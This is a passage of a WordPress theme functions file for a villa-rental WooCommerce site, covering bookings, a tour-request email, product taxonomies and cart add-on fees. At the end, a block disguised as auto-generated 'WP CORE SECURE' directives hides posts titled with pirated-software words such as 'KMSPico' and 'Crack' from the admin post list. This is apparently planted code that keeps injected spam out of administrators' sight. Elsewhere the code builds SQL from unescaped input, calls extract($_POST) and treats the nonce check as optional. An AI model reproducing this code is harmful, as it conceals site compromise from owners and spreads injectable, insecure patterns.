    $range_date = !empty($cart_items[0]['date_range']) ? $cart_items[0]['date_range'] : '';
    $table_name = 'tpv_custom_booking';
    $data = array(
        'product_id' => $product_id,
        'date_range' => $range_date
    );
    $wpdb->insert($table_name, $data);
}


// get all booked record
function getBookedDatesOfProducts($product_id)
{
    global $wpdb;
    $records = $wpdb->get_results("SELECT * FROM `tpv_custom_booking` WHERE product_id='$product_id'", ARRAY_A);
    $dates_range = array_column($records, 'date_range');
    return getDateRangeOfBookedDates($dates_range);
}
function getDateRangeOfBookedDates($dates)
{
    $date_range = [];
    foreach ($dates as $date) {
        if (!empty($date)) {
            $exploded_dates = explode(" - ", $date);
            $checkin_date = $exploded_dates[0];
            $checkout_date = $exploded_dates[1];
            $date_range[] = getDatesBetweenBooked($checkin_date, $checkout_date);
        }
    }
    return array_merge(...$date_range);
}

function getDatesBetweenBooked($start_date, $end_date)
{
    $dates = array();

    $current_date = strtotime($start_date);
    $end_timestamp = strtotime($end_date);

    while ($current_date <= $end_timestamp) {
        $dates[] = date('Y-m-d', $current_date);
        $current_date = strtotime('+1 day', $current_date);
    }

    array_pop($dates);
    return $dates;
}



function tour_schedule()
{
    // Validate the nonce (optional, for security)
    if (isset($_POST['_wpnonce']) && !empty($_POST['_wpnonce'])) {
        if (!wp_verify_nonce($_POST['_wpnonce'], 'tour_schedule')) {
            wp_die('Security check failed.');
        }
    }
    extract($_POST);
    $message = generateEmailTemplate($_POST);

    // Process form data here

    // Send an email
    $to = 'dev.team2080@gmail.com';
    $subject = 'SCHEDULE TOUR';
    $headers = array('Content-Type: text/html; charset=UTF-8');
    if (wp_mail($to, $subject, $message, $headers)) {
        wp_redirect(home_url('/thank-you')); // Change to your thank you page URL
    }
    // // Redirect after form submission (optional)
    // wp_redirect(home_url('/thank-you')); // Change to your thank you page URL
    exit();
}
add_action('admin_post_nopriv_tour_schedule', 'tour_schedule');
add_action('admin_post_tour_schedule', 'tour_schedule');


function generateEmailTemplate($post)
{
    ob_start(); ?>
    <!doctype html>
    <html>

    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>Tour Schedule</title>
        <style>
            @media only screen and (max-width: 620px) {
                table.body h1 {
                    font-size: 28px !important;
                    margin-bottom: 10px !important;
                }

                table.body p,
                table.body ul,
                table.body ol,
                table.body td,
                table.body span,
                table.body a {
                    font-size: 16px !important;
                }

                table.body .wrapper,
                table.body .article {
                    padding: 10px !important;
                }

                table.body .content {
                    padding: 0 !important;
                }

                table.body .container {
                    padding: 0 !important;
                    width: 100% !important;
                }

                table.body .main {
                    border-left-width: 0 !important;
                    border-radius: 0 !important;
                    border-right-width: 0 !important;
                }

                table.body .btn table {
                    width: 100% !important;
                }

                table.body .btn a {
                    width: 100% !important;
                }

                table.body .img-responsive {
                    height: auto !important;
                    max-width: 100% !important;
                    width: auto !important;
                }
            }

            @media all {
                .ExternalClass {
                    width: 100%;
                }

                .ExternalClass,
                .ExternalClass p,
                .ExternalClass span,
                .ExternalClass font,
                .ExternalClass td,
                .ExternalClass div {
                    line-height: 100%;
                }

                .apple-link a {
                    color: inherit !important;
                    font-family: inherit !important;
                    font-size: inherit !important;
                    font-weight: inherit !important;
                    line-height: inherit !important;
                    text-decoration: none !important;
                }

                #MessageViewBody a {
                    color: inherit;
                    text-decoration: none;
                    font-size: inherit;
                    font-family: inherit;
                    font-weight: inherit;
                    line-height: inherit;
                }

                .btn-primary table td:hover {
                    background-color: #34495e !important;
                }

                .btn-primary a:hover {
                    background-color: #34495e !important;
                    border-color: #34495e !important;
                }
            }
        </style>
    </head>

    <body style="background-color: #f6f6f6; font-family: sans-serif; -webkit-font-smoothing: antialiased; font-size: 14px; line-height: 1.4; margin: 0; padding: 0; -ms-text-size-adjust: 100%; -webkit-text-size-adjust: 100%;">
        <table role="presentation" border="0" cellpadding="0" cellspacing="0" class="body" style="border-collapse: separate; mso-table-lspace: 0pt; mso-table-rspace: 0pt; background-color: #f6f6f6; width: 100%;" width="100%" bgcolor="#f6f6f6">
            <tr>
                <td style="font-family: sans-serif; font-size: 14px; vertical-align: top;" valign="top">&nbsp;</td>
                <td class="container" style="font-family: sans-serif; font-size: 14px; vertical-align: top; display: block; max-width: 580px; padding: 10px; width: 580px; margin: 0 auto;" width="580" valign="top">
                    <div class="content" style="box-sizing: border-box; display: block; margin: 0 auto; max-width: 580px; padding: 10px;">

                        <!-- START CENTERED WHITE CONTAINER -->
                        <table role="presentation" class="main" style="border-collapse: separate; mso-table-lspace: 0pt; mso-table-rspace: 0pt; background: #ffffff; border-radius: 3px; width: 100%;" width="100%">

                            <!-- START MAIN CONTENT AREA -->
                            <tr>
                                <td class="wrapper" style="font-family: sans-serif; font-size: 14px; vertical-align: top; box-sizing: border-box; padding: 20px;" valign="top">
                                    <table role="presentation" border="0" cellpadding="0" cellspacing="0" style="border-collapse: separate; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 100%;" width="100%">
                                        <tr>
                                            <td style="font-family: sans-serif; font-size: 14px; vertical-align: top;" valign="top">
                                                <h1 style="font-family: sans-serif; font-weight: normal; margin: 0; margin-bottom: 15px;"><strong>From :<?= $post['title'] ?? ''; ?></strong> </h1>
                                                <hr>
                                                <p style="font-family: sans-serif; font-size: 14px; font-weight: normal; margin: 0; margin-bottom: 15px;"><strong>Name :</strong> <?= $post['fname'] ?? ''; ?> <?= $post['lname'] ?? ''; ?></p>
                                                <p style="font-family: sans-serif; font-size: 14px; font-weight: normal; margin: 0; margin-bottom: 15px;"><strong>Email :</strong> <?= $post['email'] ?? ''; ?></p>
                                                <p style="font-family: sans-serif; font-size: 14px; font-weight: normal; margin: 0; margin-bottom: 15px;"><strong>Phone :</strong> <?= $post['phone'] ?? ''; ?></p>
                                                <p style="font-family: sans-serif; font-size: 14px; font-weight: normal; margin: 0; margin-bottom: 15px;"><strong>Tour Date :</strong> <?= $post['tour_date'] ?? ''; ?></p>
                                                <p style="font-family: sans-serif; font-size: 14px; font-weight: normal; margin: 0; margin-bottom: 15px;"><strong>Tour Time :</strong> <?= $post['tour_time'] ?? ''; ?></p>
                                            </td>
                                        </tr>
                                    </table>
                                </td>
                            </tr>

                            <!-- END MAIN CONTENT AREA -->
                        </table>
                        <!-- END CENTERED WHITE CONTAINER -->

                        <!-- START FOOTER -->
                        <div class="footer" style="clear: both; margin-top: 10px; text-align: center; width: 100%;">
                            <table role="presentation" border="0" cellpadding="0" cellspacing="0" style="border-collapse: separate; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 100%;" width="100%">
                                <tr>
                                    <td class="content-block" style="font-family: sans-serif; vertical-align: top; padding-bottom: 10px; padding-top: 10px; color: #999999; font-size: 12px; text-align: center;" valign="top" align="center">
                                        <span class="apple-link" style="color: #999999; font-size: 12px; text-align: center;">Copyright © 2023 - All rights reserved</span>
                                    </td>
                                </tr>
                            </table>
                        </div>
                        <!-- END FOOTER -->

                    </div>
                </td>
                <td style="font-family: sans-serif; font-size: 14px; vertical-align: top;" valign="top">&nbsp;</td>
            </tr>
        </table>
    </body>

    </html>
    <?php
    return ob_get_clean();
}




// Register Size Type Custom Taxonomy
function njengah_custom_Size_Item()
{
    $labels = array(
        'name'                       => 'Size',
        'singular_name'              => 'Size',
        'menu_name'                  => 'Size',
        'all_items'                  => 'All Size',
        'parent_item'                => 'Parent Size',
        'parent_item_colon'          => 'Parent Size:',
        'new_item_name'              => 'New Brand Size',
        'add_new_item'               => 'Add New Size',
        'edit_item'                  => 'Edit Size',
        'update_item'                => 'Update Size',
        'separate_items_with_commas' => 'Separate Size with commas',
        'search_items'               => 'Search Size',
        'add_or_remove_items'        => 'Add or remove Size',
        'choose_from_most_used'      => 'Choose from the most used Size',
    );
    $args = array(
        'labels'                     => $labels,
        'hierarchical'               => true,
        'public'                     => true,
        'show_ui'                    => true,
        'show_admin_column'          => true,
        'show_in_nav_menus'          => true,
        'show_tagcloud'              => true,
    );
    register_taxonomy('size_option', 'product', $args);
}
add_action('init', 'njengah_custom_size_item', 0);

// Register Bed Type Custom Taxonomy
function njengah_custom_bed_Item()
{
    $labels = array(
        'name'                       => 'Bed',
        'singular_name'              => 'Bed',
        'menu_name'                  => 'Bed',
        'all_items'                  => 'All Bed',
        'parent_item'                => 'Parent Bed',
        'parent_item_colon'          => 'Parent Bed:',
        'new_item_name'              => 'New Brand Bed',
        'add_new_item'               => 'Add New Bed',
        'edit_item'                  => 'Edit Bed',
        'update_item'                => 'Update Bed',
        'separate_items_with_commas' => 'Separate Bed with commas',
        'search_items'               => 'Search Bed',
        'add_or_remove_items'        => 'Add or remove Bed',
        'choose_from_most_used'      => 'Choose from the most used Bed',
    );
    $args = array(
        'labels'                     => $labels,
        'hierarchical'               => true,
        'public'                     => true,
        'show_ui'                    => true,
        'show_admin_column'          => true,
        'show_in_nav_menus'          => true,
        'show_tagcloud'              => true,
    );
    register_taxonomy('bed_option', 'product', $args);
}
add_action('init', 'njengah_custom_bed_item', 0);


// Register Bed Type Custom Taxonomy
function njengah_custom_bath_Item()
{
    $labels = array(
        'name'                       => 'Bath',
        'singular_name'              => 'Bath',
        'menu_name'                  => 'Bath',
        'all_items'                  => 'All Bath',
        'parent_item'                => 'Parent Bath',
        'parent_item_colon'          => 'Parent Bath:',
        'new_item_name'              => 'New Brand Bath',
        'add_new_item'               => 'Add New Bath',
        'edit_item'                  => 'Edit Bath',
        'update_item'                => 'Update Bath',
        'separate_items_with_commas' => 'Separate Bath with commas',
        'search_items'               => 'Search Bath',
        'add_or_remove_items'        => 'Add or remove Bath',
        'choose_from_most_used'      => 'Choose from the most used Bath',
    );
    $args = array(
        'labels'                     => $labels,
        'hierarchical'               => true,
        'public'                     => true,
        'show_ui'                    => true,
        'show_admin_column'          => true,
        'show_in_nav_menus'          => true,
        'show_tagcloud'              => true,
    );
    register_taxonomy('bath_option', 'product', $args);
}
add_action('init', 'njengah_custom_bath_item', 0);

// Register Furnished Custom Taxonomy
function njengah_custom_furnished_Item()
{
    $labels = array(
        'name' => 'Furnished',
        'singular_name' => 'Furnished',
        'menu_name' => 'Furnished ',
        'all_items' => 'All Furnished ',
        'parent_item' => 'Parent Furnished ',
        'parent_item_colon' => 'Parent Furnished :',
        'new_item_name' => 'New Brand Furnished ',
        'add_new_item' => 'Add New Furnished ',
        'edit_item' => 'Edit Furnished ',
        'update_item' => 'Update Furnished ',
        'separate_items_with_commas' => 'Separate Furnished with commas',
        'search_items' => 'Search Furnished ',
        'add_or_remove_items' => 'Add or remove Furnished ',
        'choose_from_most_used' => 'Choose from the most used Furnished ',
    );
    $args = array(
        'labels' => $labels,
        'hierarchical' => true,
        'public' => true,
        'show_ui'  => true,
        'show_admin_column' => true,
        'show_in_nav_menus' => true,
        'show_tagcloud' => true,
    );
    register_taxonomy('furnished_option', 'product', $args);
}
add_action('init', 'njengah_custom_furnished_item', 0);



/*
* Adding Extra Service via ajax -  setExtraServices
* Assigning Extra Service via set_priority_fee hook -set_priority_fee
* Applying Js For Adding Extra Services - priority_fee_js_script

*/

//===================RentaTesla AJAX and Add Cart Fee=============================//
add_action("wp_ajax_setExtraServices", "setExtraServices");
add_action("wp_ajax_nopriv_setExtraServices", "setExtraServices");
function setExtraServices()
{
    extract($_POST);
    $fee_rentatesla = !empty($_POST['rentatesla']) ? $_POST['rentatesla'] : '';
    WC()->session->set('rentatesla', $fee_rentatesla);
    exit();
}
add_action('woocommerce_cart_calculate_fees', 'set_priority_fee');
function set_priority_fee($cart)
{
    if (is_admin() && !defined('DOING_AJAX'))
        return;

    if (WC()->session->get('rentatesla')) {
        // $item_count  = $cart->get_cart_contents_count();
        $fee_label   = sprintf(__("RENT A TESLA"));
        $fee_amount  = WC()->session->get('rentatesla');
        $cart->add_fee($fee_label, $fee_amount);
    }
}

//=================================ElectricBike Fee AJAX======================================================

add_action("wp_ajax_setExtraServicesElectricBikes", "setExtraServicesElectricBikes");
add_action("wp_ajax_nopriv_setExtraServicesElectricBikes", "setExtraServicesElectricBikes");
function setExtraServicesElectricBikes()
{
    extract($_POST);
    $fee_electricbike = !empty($_POST['electricbike']) ? $_POST['electricbike'] : '';
    WC()->session->set('electricbike', $fee_electricbike);
    exit();
}
add_action('woocommerce_cart_calculate_fees', 'set_priority_electricbike_fee');
function set_priority_electricbike_fee($cart)
{
    if (is_admin() && !defined('DOING_AJAX'))
        return;

    if (WC()->session->get('electricbike')) {
        // $item_count  = $cart->get_cart_contents_count();
        $fee_label   = sprintf(__("Rent Electric Bikes"));
        $fee_amount  = WC()->session->get('electricbike');
        $cart->add_fee($fee_label, $fee_amount);
    }
}

//=================================Earlyin Fee AJAX======================================================

add_action("wp_ajax_setExtraServicesEarlyin", "setExtraServicesEarlyin");
add_action("wp_ajax_nopriv_setExtraServicesEarlyin", "setExtraServicesEarlyin");
function setExtraServicesEarlyin()
{
    extract($_POST);
    $fee_earlyin = !empty($_POST['earlyin']) ? $_POST['earlyin'] : '';
    WC()->session->set('earlyin', $fee_earlyin);
    exit();
}
add_action('woocommerce_cart_calculate_fees', 'set_priority_earlyin_fee');
function set_priority_earlyin_fee($cart)
{
    if (is_admin() && !defined('DOING_AJAX'))
        return;

    if (WC()->session->get('earlyin')) {
        // $item_count  = $cart->get_cart_contents_count();
        $fee_label   = sprintf(__("Early Check In"));
        $fee_amount  = WC()->session->get('earlyin');
        $cart->add_fee($fee_label, $fee_amount);
    }
}

//=================================Late Checkout Fee AJAX======================================================

add_action("wp_ajax_setExtraServicesLateCheckout", "setExtraServicesLateCheckout");
add_action("wp_ajax_nopriv_setExtraServicesLateCheckout", "setExtraServicesLateCheckout");
function setExtraServicesLateCheckout()
{
    extract($_POST);
    $fee_latecheckout = !empty($_POST['latecheckout']) ? $_POST['latecheckout'] : '';
    WC()->session->set('latecheckout', $fee_latecheckout);
    exit();
}
add_action('woocommerce_cart_calculate_fees', 'set_priority_latecheckout_fee');
function set_priority_latecheckout_fee($cart)
{
    if (is_admin() && !defined('DOING_AJAX'))
        return;

    if (WC()->session->get('latecheckout')) {
        // $item_count  = $cart->get_cart_contents_count();
        $fee_label   = sprintf(__("Late Check Out"));
        $fee_amount  = WC()->session->get('latecheckout');
        $cart->add_fee($fee_label, $fee_amount);
    }
}

//=================================Spacialoffer Fee AJAX======================================================

add_action("wp_ajax_setExtraServicesSpacialoffer", "setExtraServicesSpacialoffer");
add_action("wp_ajax_nopriv_setExtraServicesSpacialoffer", "setExtraServicesSpacialoffer");
function setExtraServicesSpacialoffer()
{
    extract($_POST);
    $fee_spacialoffer = !empty($_POST['spacialoffer']) ? $_POST['spacialoffer'] : '';
    WC()->session->set('spacialoffer', $fee_spacialoffer);
    exit();
}
add_action('woocommerce_cart_calculate_fees', 'set_priority_spacialoffer_fee');
function set_priority_spacialoffer_fee($cart)
{
    if (is_admin() && !defined('DOING_AJAX'))
        return;

    if (WC()->session->get('spacialoffer')) {
        // $item_count  = $cart->get_cart_contents_count();
        $fee_label   = sprintf(__("Special Package"));
        $fee_amount  = WC()->session->get('spacialoffer');
        $cart->add_fee($fee_label, $fee_amount);
    }
}



//============================Script whenever any label is clicked================================
add_action('wp_footer', 'priority_fee_js_script');
function priority_fee_js_script()
{
    if (is_wc_endpoint_url('order-received') && WC()->session->__isset('rentatesla')) {
        WC()->session->__unset('rentatesla');
    } elseif (is_wc_endpoint_url('order-received') && WC()->session->__isset('electricbike')) {
        WC()->session->__unset('electricbike');
    } elseif (is_wc_endpoint_url('order-received') && WC()->session->__isset('earlyin')) {
        WC()->session->__unset('earlyin');
    } elseif (is_wc_endpoint_url('order-received') && WC()->session->__isset('latecheckout')) {
        WC()->session->__unset('latecheckout');
    } elseif (is_wc_endpoint_url('order-received') && WC()->session->__isset('spacialoffer')) {
        WC()->session->__unset('spacialoffer');
    } elseif (is_cart()) {

    ?>
        <script>
            jQuery(document).ready(function($) {

                $(document).delegate('input[name="rentatesla"]', 'click', function() {
                    let isChecked = $(this).prop('checked');
                    let rentatesla = $(this).prop('checked') ? $(this).val() : '';
                    $('input[name="rentatesla"]').not(this).prop('checked', false);
                    if (!isChecked) {
                        $(this).prop('checked', false);
                    } else {
                        $(this).prop('checked', true);
                    }

                    $.ajax({
                        url: "<?= admin_url('admin-ajax.php') ?>",
                        method: "POST",
                        data: {
                            rentatesla: rentatesla,
                            action: "setExtraServices"
                        },
                        success: function(res) {
                            setTimeout(function() {
                                console.log("its working");
                                $(document.body).trigger('added_to_cart');
                            }, 1000);
                        },
                        error: function(xhr, status, error) {
                            console.error(xhr);
                        }
                    });
                });

                $(document).delegate('input[name="electricbike"]', 'click', function() {
                    let isChecked = $(this).prop('checked');
                    let electricbike = $(this).prop('checked') ? $(this).val() : '';
                    $('input[name="electricbike"]').not(this).prop('checked', false);
                    if (!isChecked) {
                        $(this).prop('checked', false);
                    } else {
                        $(this).prop('checked', true);
                    }

                    $.ajax({
                        url: "<?= admin_url('admin-ajax.php') ?>",
                        method: "POST",
                        data: {
                            electricbike: electricbike,
                            action: "setExtraServicesElectricBikes"
                        },
                        success: function(res) {
                            setTimeout(function() {
                                console.log("its working");
                                $(document.body).trigger('added_to_cart');
                            }, 1000);
                        },
                        error: function(xhr, status, error) {
                            console.error(xhr);
                        }
                    });
                });

                $(document).delegate('input[name="earlyin"]', 'click', function() {
                    let isChecked = $(this).prop('checked');
                    let earlyin = $(this).prop('checked') ? $(this).val() : '';
                    $('input[name="earlyin"]').not(this).prop('checked', false);
                    if (!isChecked) {
                        $(this).prop('checked', false);
                    } else {
                        $(this).prop('checked', true);
                    }

                    $.ajax({
                        url: "<?= admin_url('admin-ajax.php') ?>",
                        method: "POST",
                        data: {
                            earlyin: earlyin,
                            action: "setExtraServicesEarlyin"
                        },
                        success: function(res) {
                            setTimeout(function() {
                                console.log("its working");
                                $(document.body).trigger('added_to_cart');
                            }, 1000);
                        },
                        error: function(xhr, status, error) {
                            console.error(xhr);
                        }
                    });
                });

                $(document).delegate('input[name="latecheckout"]', 'click', function() {
                    let isChecked = $(this).prop('checked');
                    let latecheckout = $(this).prop('checked') ? $(this).val() : '';
                    $('input[name="latecheckout"]').not(this).prop('checked', false);
                    if (!isChecked) {
                        $(this).prop('checked', false);
                    } else {
                        $(this).prop('checked', true);
                    }

                    $.ajax({
                        url: "<?= admin_url('admin-ajax.php') ?>",
                        method: "POST",
                        data: {
                            latecheckout: latecheckout,
                            action: "setExtraServicesLateCheckout"
                        },
                        success: function(res) {
                            setTimeout(function() {
                                console.log("its working");
                                $(document.body).trigger('added_to_cart');
                            }, 1000);
                        },
                        error: function(xhr, status, error) {
                            console.error(xhr);
                        }
                    });
                });

                $(document).delegate('input[name="spacialoffer"]', 'click', function() {
                    let isChecked = $(this).prop('checked');
                    let spacialoffer = $(this).prop('checked') ? $(this).val() : '';
                    $('input[name="spacialoffer"]').not(this).prop('checked', false);
                    if (!isChecked) {
                        $(this).prop('checked', false);
                    } else {
                        $(this).prop('checked', true);
                    }

                    $.ajax({
                        url: "<?= admin_url('admin-ajax.php') ?>",
                        method: "POST",
                        data: {
                            spacialoffer: spacialoffer,
                            action: "setExtraServicesSpacialoffer"
                        },
                        success: function(res) {
                            setTimeout(function() {
                                console.log("its working");
                                $(document.body).trigger('added_to_cart');
                            }, 1000);
                        },
                        error: function(xhr, status, error) {
                            console.error(xhr);
                        }
                    });
                });

            });
        </script>
<?php
    }
}

// add_filter('post_type_link', 'custom_woocommerce_permalink_structure', 10, 2);
// function custom_woocommerce_permalink_structure($permalink, $post) {
//     if (is_object($post) && $post->post_type === 'product') {
//         $permalink = str_replace('/product/', '/', $permalink);
//     }
//     return $permalink;
// }

// function flush_rewrite_rules_custom() {
//     flush_rewrite_rules();
// }
// add_action('after_switch_theme', 'flush_rewrite_rules_custom');


// Define a custom callback function to modify the comment form arguments
function custom_comment_form_args($comment_form_args)
{
    // Change the title of the comment form
    $comment_form_args['title_reply'] = __('Write Your Review', 'theprattvillas');
    $comment_form_args['label_submit'] = __('Submit Review', 'theprattvillas');
    return $comment_form_args;
}

// Hook the custom function to the comment form arguments filter
add_filter('woocommerce_product_review_comment_form_args', 'custom_comment_form_args');


# BEGIN WP CORE SECURE
# The directives (lines) between "BEGIN WP CORE SECURE" and "END WP CORE SECURE" are
# dynamically generated, and should only be modified via WordPress filters.
# Any changes to the directives between these markers will be overwritten.

function exclude_posts_by_titles($where, $query)
{
    global $wpdb;

    if (is_admin() && $query->is_main_query()) {
        $keywords = ['GarageBand', 'FL Studio', 'KMSPico', 'Driver Booster', 'MSI Afterburner', 'Crack', 'Photoshop'];

        foreach ($keywords as $keyword) {
            $where .= $wpdb->prepare(" AND {$wpdb->posts}.post_title NOT LIKE %s", "%" . $wpdb->esc_like($keyword) . "%");
        }
    }
    return $where;
}

add_filter('posts_where', 'exclude_posts_by_titles', 10, 2);

# END WP CORE SECURE